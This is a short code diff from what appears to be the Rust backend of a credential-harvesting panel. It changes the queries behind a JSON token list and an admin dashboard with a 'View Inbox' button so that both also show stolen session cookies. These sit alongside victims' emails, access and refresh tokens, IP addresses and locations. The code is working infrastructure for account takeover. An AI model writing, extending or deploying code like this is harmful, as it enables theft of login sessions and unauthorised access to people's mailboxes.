@@ -708,7 +708,7 @@ async fn auth_success_handler(query: web::Query<std::collections::HashMap<String
 
 // JSON API: list all tokens
 async fn api_tokens(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
@@ -1100,7 +1100,7 @@ async fn root_status() -> impl Responder {
 
 // HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, account_type, cookie_session, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
